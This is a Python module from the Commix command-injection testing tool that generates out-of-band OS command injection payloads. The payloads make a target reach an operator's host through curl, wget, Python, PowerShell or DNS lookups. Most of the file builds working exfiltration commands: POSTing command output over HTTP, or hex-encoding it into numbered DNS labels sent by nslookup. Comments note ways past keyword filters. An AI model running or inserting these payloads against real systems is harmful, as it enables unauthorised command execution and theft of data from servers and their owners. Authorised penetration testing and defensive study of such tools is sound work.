#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import random
import string
import binascii

from src.core.parse import cmdline as menu
from src.utils import settings
from src.core.controller import checks

"""
The out-of-band technique on OS command injection.
The available out-of-band payloads.
"""

PIPE = "|"
# 'Or else', for a chain of lookup commands where only some of them exist on the target.
OR = PIPE + PIPE
# A bare '+' would be read as a space where the payload is URL-decoded.
PLUS = "+"

"""
The HTTP clients used to reach the out-of-band server, most common first.
"""
UNIX_TRANSPORTS = ["curl", "wget", "python", "dns"]
# 'curl.exe' leads on Windows, where it has shipped in System32 since Windows 10 1803: unlike a
# name lookup it carries command output back, and it is quick to give up where a host has no way
# out. A lookup follows, present on every Windows and the one confirmed against a real target.
# 'certutil' is deliberately absent - it blocks for over a minute per request, and a sweep of
# those would tie up the target's worker pool.
WINDOWS_TRANSPORTS = ["curl", "dns", "powershell"]
# Clients that hold the request open for a long time on a host with no way out, so they are worth a
# probe only where the sweep has nothing else left to try - never for a yes/no a lookup has answered.
SLOW_TRANSPORTS = ("powershell",)

"""
The URL a payload sends the target to, over the same scheme the out-of-band server is reached on.
"""
def _url(hostname, proof=""):
  scheme = settings.OOB_SCHEME or "https"
  port = ""
  # Named only when it is not the scheme's own, so a public server's URL stays as short as it was.
  if settings.OOB_PORT and settings.OOB_PORT != (443 if scheme == "https" else 80):
    port = ":" + str(settings.OOB_PORT)
  return scheme + "://" + hostname + port + "/" + proof

"""
Build the Python program a payload runs, reading its body from stdin when a command is being sent.

Python verifies certificates against a CA store the target often does not have, and a failure there
costs the whole transport, so verification is turned off - the output is still encrypted. Setting the
module default rather than passing a context keeps this working on Python older than 3.4.3, where
'urlopen' takes no context and does not verify in the first place.
"""
def _python_prog(hostname, from_stdin=False, proof=""):
  imports = "import ssl,sys,urllib.request;" if from_stdin else "import ssl,urllib.request;"
  relax = ""
  if (settings.OOB_SCHEME or "https") == "https":
    relax = "setattr(ssl,'_create_default_https_context',getattr(ssl,'_create_unverified_context',None));"
  body = ",data=sys.stdin.buffer.read()" if from_stdin else ""
  # The program is inside double quotes, so the shell still does the sum before Python sees the URL.
  return (settings.LINUX_PYTHON_INTERPRETER + " -c \"" + imports + relax +
          "urllib.request.urlopen('" + _url(hostname, proof) + "'" + body + ")\"")

"""
Build the command that makes the target contact a hostname, carrying a sum for it to evaluate.
"""
def reach_command(transport, hostname, proof="", separator=OR):
  if transport == "curl":
    return "curl -s " + _url(hostname, proof)
  if transport == "wget":
    return "wget -qO- " + _url(hostname, proof)
  if transport == "python":
    return _python_prog(hostname, proof=proof)
  if transport == "dns":
    # Resolving the name is enough to prove execution, and needs no HTTP client at all.
    return dns_lookup_command(hostname, separator)
  if transport == "powershell":
    # 'iwr' only exists from PowerShell 3.0, while Net.WebClient goes back to 1.0. The URL keeps
    # the single quotes cmd.exe passes through untouched - a double quoted one arrives stripped of
    # them - and stdin is closed, so nothing waits on a console the target has not got.
    return ("powershell.exe -InputFormat none -Command (New-Object Net.WebClient).DownloadString('"
            + _url(hostname, proof) + "')")
  return ""

"""
The command that makes the target resolve a name.

On Windows 'nslookup' is always there. Elsewhere it is part of an optional package, so the ones a
host is likely to have instead follow it, and 'ping' comes last because it waits for a reply that a
host with no ICMP out will never get. They are chained with the separator being tested, so a sink
that filters some other operator does not defeat the separator that would have worked; where there
is nothing to chain with, only the likeliest command is sent.
"""
def dns_lookup_command(hostname, separator=OR):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return "nslookup " + hostname
  commands = ["nslookup " + hostname, "getent hosts " + hostname, "host " + hostname, "ping -c1 " + hostname]
  if not separator:
    return commands[0]
  return separator.join(commands)

"""
Out-of-band decision payload (check if host is vulnerable).
"""
def decision(separator, transport, hostname, proof="", prologue=""):
  payload = separator + prologue + reach_command(transport, hostname, proof, separator)
  if settings.TARGET_OS != settings.OS.WINDOWS:
    payload = checks.append_custom_marker(payload, separator)
  # The payload ends on a hostname, so it is the part a sink's own trailing characters would land in.
  return payload + checks.shell_tail()

# Standing in for a command, so how a language wraps one can be read back off the result.
EVAL_MARK = "\x00command\x00"

# How the language now in force renders a command whose output it hands back.
def _rendered(command):
  return settings.EVAL_GRAMMAR.print_statement("", [command])

"""
Out-of-band decision payload for a dynamic code evaluation sink.
"""
def decision_eval(separator, transport, hostname, proof="", prologue=""):
  command = prologue + reach_command(transport, hostname, proof)
  return _rendered(command) + (settings.EVAL_GRAMMAR.TERMINATOR if separator else "")

"""
Out-of-band payload that sends the output of a command back through an evaluation sink.
"""
def exfiltrate_eval(separator, transport, hostname, cmd):
  inner = exfiltrate("", transport, hostname, cmd)
  if not inner:
    return ""
  return _rendered(inner) + (settings.EVAL_GRAMMAR.TERMINATOR if separator else "")

"""
The prefixes an evaluation sink is reached through, execution functions included.
"""
def eval_prefixes():
  return checks.eval_prefixes()

"""
Report whether a stored payload targets an evaluation sink.
"""
def is_eval(payload):
  if not payload:
    return False
  # A stored payload may have been built in a language other than the one in force now, so every
  # supported one is asked how it opens such a call.
  from src.core import eval as _eval
  for language in settings.SUPPORTED_EVAL_LANGUAGES:
    opening = _eval.grammar(language).print_statement("", [EVAL_MARK]).split(EVAL_MARK)[0]
    if opening and opening in payload:
      return True
  return False

"""
Name the transport a stored payload was built with.
"""
def transport_of(payload):
  payload = payload or ""
  # Keyed on what the payload runs, which is not always the transport's name. A stored payload is
  # URL-encoded, so a marker must not rely on whitespace.
  # Tamper scripts such as 'doublequotes', 'caret', 'backslashes' and 'dollaratsigns' interleave
  # filler between a word's letters to dodge keyword filters, which splits a marker apart - strip
  # that filler back out before looking for one.
  normalized = re.sub(r'""|\^|\\|\$@', "", payload)
  for transport, marker in (("python", "urllib.request"), ("dns", "nslookup"), ("curl", "curl"),
                            ("wget", "wget"), ("powershell", "powershell")):
    if marker in normalized:
      return transport
  return ""

"""
The transports to try, in order. A confirmed one wins outright, and '--interpreter' tells us the
target has Python, so that client is worth trying before the rest.
"""
def transports():
  if settings.OOB_TRANSPORT:
    return [settings.OOB_TRANSPORT]
  order = list(WINDOWS_TRANSPORTS) if settings.TARGET_OS == settings.OS.WINDOWS else list(UNIX_TRANSPORTS)
  if menu.options.interpreter and "python" in order:
    order.remove("python")
    order.insert(0, "python")
  # The one the heuristic already saw answer leads, whichever kind it is.
  if settings.OOB_HEURISTIC_TRANSPORT in order:
    order.remove(settings.OOB_HEURISTIC_TRANSPORT)
    order.insert(0, settings.OOB_HEURISTIC_TRANSPORT)
  # An HTTP client that stayed silent on a payload the heuristic proved had run is not worth a probe
  # on every boundary of the sweep: the lookup carries the sweep on its own, and the clients that
  # were never asked are tried once - on the boundary the lookup confirms.
  if settings.OOB_HEURISTIC_HTTP_SILENT and any(required_protocol(candidate) == "dns" for candidate in order):
    order = [candidate for candidate in order if required_protocol(candidate) == "dns"]
  return order

"""
The clients worth one request each once a boundary is confirmed: the ones that carry output back
whole and that the heuristic never got to ask. A slow one is left out - the point is already found,
so a client that blocks for half a minute costs more than the whole output it might have carried.
"""
def upgrade_candidates():
  return [candidate for candidate in exfiltration_alternatives("dns")
          if required_protocol(candidate) == "http" and candidate not in SLOW_TRANSPORTS
          and candidate not in settings.OOB_HEURISTIC_HTTP_SILENT]

"""
The HTTP clients that were really asked, so a report names those and not the ones left out.
"""
def tried_http_clients():
  if not settings.OOB_HEURISTIC_HTTP_SILENT:
    return [candidate for candidate in exfiltration_alternatives("dns") if required_protocol(candidate) == "http"]
  return list(dict.fromkeys(list(settings.OOB_HEURISTIC_HTTP_SILENT) + upgrade_candidates()))

"""
The clients that could have carried command output back, and so were tried ahead of this one.
"""
def exfiltration_alternatives(transport):
  order = WINDOWS_TRANSPORTS if settings.TARGET_OS == settings.OS.WINDOWS else UNIX_TRANSPORTS
  return [candidate for candidate in order if candidate != transport and supports_exfiltration(candidate)]

"""
The interaction a transport has to produce to count as working. Resolving the name is not enough
for an HTTP client - it happens even when the request itself never completes.
"""
def required_protocol(transport):
  return "dns" if transport == "dns" else "http"

"""
Build one heuristic payload that tries several clients across several separators at once, plus the
tokens to watch for.

This is only a cheap yes/no on whether the parameter is worth testing, so it carries no sum to
check - the sweep proves execution properly before anything is reported.
"""
def heuristic_payload(channel, target_os):
  if target_os == settings.OS.WINDOWS:
    # Both of cmd.exe's chaining operators, over the two clients that answer quickly. PowerShell
    # is left out on purpose: where a host has no way out, it holds the request open for far
    # longer than a yes/no is worth.
    pairs = (("&", "curl"), ("&", "dns"), ("|", "dns"))
  else:
    # One HTTP client and the name lookup on both of the separators a shell chains on: a host that
    # lets nothing out over HTTP still answers through its resolver.
    pairs = ((";", "curl"), ("&", "dns"), ("|", "dns"))
  parts = []
  probes = []
  for separator, transport in pairs:
    token, hostname = channel.new_payload()
    parts.append(separator + reach_command(transport, hostname, separator=separator))
    probes.append((token, transport))
  payload = "".join(parts)
  payload = payload + (checks.WINDOWS_TAIL if target_os == settings.OS.WINDOWS else checks.UNIX_TAIL)
  return payload, probes

"""
Report whether a transport can carry a computation the receiving end can check.
"""
def supports_proof(transport):
  return transport in ("curl", "wget", "python", "powershell")

"""
Build a sum for the target to evaluate, returned as (expression, expected result, prologue). The
prologue is whatever has to run before the command for the expression to hold a value - nothing,
on a shell that expands arithmetic inside an argument.

An interaction only proves that something reached us - a filtering appliance that fetches URLs it
finds in a parameter would produce the same signal, and re-verifying with a fresh token would not
tell the two apart. A shell that really ran the command sends the sum's result; anything replaying
the URL verbatim sends the expression instead.
"""
def proof(transport, plus=PLUS):
  if not supports_proof(transport):
    return "", "", ""
  first = random.randrange(1000, 9999)
  second = random.randrange(1000, 9999)
  # Bracketed by a marker, so the result cannot be mistaken for a number occurring anywhere else.
  tag = "".join(random.choice(string.ascii_uppercase) for _ in range(6))
  if transport == "powershell":
    # Concatenated outside the URL's quotes: PowerShell expands nothing inside a single-quoted
    # string, so a sum left in there would be sent as written.
    total = "'" + plus + "(" + str(first) + plus + str(second) + ")" + plus + "'"
  elif settings.TARGET_OS == settings.OS.WINDOWS:
    # 'set /a' is the only arithmetic cmd.exe has and it only writes its answer out, so the sum is
    # worked out first and read into the variable the command is then built around.
    prologue = ("for /f \"tokens=* eol=\" %i in ('cmd /c \"set /a " + str(first) + plus + str(second) +
                "\"') do ")
    return tag + "%i" + tag, tag + str(first + second) + tag, prologue
  elif settings.USE_BACKTICKS or settings.WAF_ENABLED:
    # Same fallback the classic technique uses, so '--tamper=backticks' reaches here too.
    total = (settings.CMD_SUB_PREFIX + "expr" + settings.SINGLE_WHITESPACE + str(first) +
             settings.SINGLE_WHITESPACE + plus + settings.SINGLE_WHITESPACE + str(second) +
             settings.CMD_SUB_SUFFIX)
  else:
    total = settings.CMD_SUB_PREFIX + "(" + str(first) + plus + str(second) + "))"
  return tag + total + tag, tag + str(first + second) + tag, ""

"""
Report whether a transport can carry command output back.
"""
def supports_exfiltration(transport):
  return transport in ("curl", "wget", "python", "powershell", "dns")

"""
Hex characters per label, so a name stays inside the 253 bytes a DNS query has for it. Even, so a
byte is never split across two labels.
"""
DNS_CHUNK = 60

"""
Build the command that reads a command's output out over name resolution alone: the output goes out
hex-encoded, a chunk to a label, each one numbered so the pieces can be put back in order.

Hex, because a label holds letters, digits and hyphens only - and lowercase on the way back, since a
resolver is free to change the case of what it forwards.
"""
def dns_exfil_command(hostname, cmd, separator=""):
  chunk = str(DNS_CHUNK)
  if settings.TARGET_OS == settings.OS.WINDOWS:
    # No pipe and no double quote of its own: cmd.exe would read the first as its own and strip the
    # second before PowerShell ever saw them.
    # Every '+' goes in encoded: a bare one arrives as a space where the payload is URL-decoded.
    return ("powershell.exe -InputFormat none -Command "
            "$h=[BitConverter]::ToString([Text.Encoding]::UTF8.GetBytes((" +
            "[string](cmd /c " + cmd + ")).Trim())).Replace('-','');"
            "$t=[int][Math]::Ceiling($h.Length/" + chunk + ");$i=0;"
            "while($i -lt $h.Length){"
            "$c=$h.Substring($i,[Math]::Min(" + chunk + ",$h.Length-$i));"
            "nslookup ([string]([int]($i/" + chunk + ")" + PLUS + "1)" + PLUS + "'-'" + PLUS +
            "[string]$t" + PLUS + "'.'" + PLUS + "$c" + PLUS + "'." + hostname + "');"
            "$i" + PLUS + "=" + chunk + "}")
  # The hex goes out as one pipeline, so the payload needs no separator of its own beyond the one
  # under test: 'fold' cuts the chunks, 'cat -n' numbers them, and the tab it numbers with becomes
  # the label separator. 'od' and the tools around it are POSIX, so this holds outside bash as well.
  encoded = ("(" + cmd + ")" + PIPE + "od -An -v -tx1" + PIPE +
             "tr -d ' " + settings.END_LINE.ESCAPED_LF + "'")
  if separator not in (";", "\n", "\r\n"):
    # The name goes in through the environment and the chunk as an argument, because a BSD 'xargs'
    # will not build a replaced argument longer than 255 bytes - the lookup chain alone is more.
    return (encoded + PIPE + "fold -w" + chunk + PIPE + "cat -n" + PIPE + "tr -d ' '" + PIPE +
            "tr '\\t' '.'" + PIPE + "xargs -I{} env H=" + hostname + " sh -c '" +
            dns_lookup_command("$0.$H") + "' {}")
  # A separator that ends a statement can carry a loop instead, which knows how many chunks there
  # are and says so in every label - the reading end then knows when it has them all. A space after
  # the opening, or '$((' would be read as arithmetic instead of a subshell.
  return (settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + settings.SINGLE_WHITESPACE + encoded + settings.CMD_SUB_SUFFIX + separator +
          "t=$(( (${#" + settings.RANDOM_VAR_GENERATOR + "} + " + str(DNS_CHUNK - 1) + ") / " + chunk + " ))" + separator + "i=1" + separator + "n=1" + separator +
          "r(){ " + dns_lookup_command("$1", separator) + separator + "}" + separator +
          "while [ $i -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + separator + "do " +
          "r $n-$t.$(echo $" + settings.RANDOM_VAR_GENERATOR + "|cut -c$i-$((i+" + str(DNS_CHUNK - 1) + ")))." + hostname + separator +
          "i=$((i+" + chunk + "))" + separator + "n=$((n+1))" + separator + "done")

"""
Put the pieces of a hex-encoded output back together, in the order the labels numbered them.
"""
def decode_dns_output(chunks):
  if not chunks:
    return ""
  encoded = "".join(chunks[index] for index in sorted(chunks))
  # A half byte at the end means a chunk went missing on the way.
  encoded = encoded[:len(encoded) - len(encoded) % 2]
  try:
    decoded = binascii.unhexlify(encoded.encode()).decode(settings.DEFAULT_CODEC, errors="replace")
  except (binascii.Error, TypeError):
    return ""
  # The encoding takes the command's output as it stands, trailing newline and all.
  return decoded.rstrip(settings.END_LINE.CR + settings.END_LINE.LF)

"""
Build the command that sends the output of a command to the server.
"""
def exfil_command(transport, hostname, cmd, pipe=PIPE, separator=""):
  if transport == "dns":
    return dns_exfil_command(hostname, cmd, separator)
  # Grouped, or a compound command sends only its last part.
  grouped = "(" + cmd + ")"
  if transport == "curl":
    return grouped + pipe + "curl -s --data-binary @- " + _url(hostname)
  if transport == "wget":
    # wget cannot post from stdin.
    return "wget -qO- --post-data=\"$" + grouped + "\" " + _url(hostname)
  if transport == "python":
    return grouped + pipe + _python_prog(hostname, from_stdin=True)
  if transport == "powershell":
    # Out-String joins the lines into one body.
    return ("powershell.exe -c iwr -Uri " + _url(hostname) + " -Method POST -Body "
            "(cmd /c '" + cmd + "'" + pipe + "Out-String) -UseBasicParsing")
  return ""

"""
Out-of-band payload that sends the output of a command to the server.
"""
def exfiltrate(separator, transport, hostname, cmd):
  command = exfil_command(transport, hostname, cmd, separator=separator)
  if not command:
    return ""
  payload = separator + command
  if settings.TARGET_OS != settings.OS.WINDOWS:
    payload = checks.append_custom_marker(payload, separator)
  return payload + checks.shell_tail()

# eof
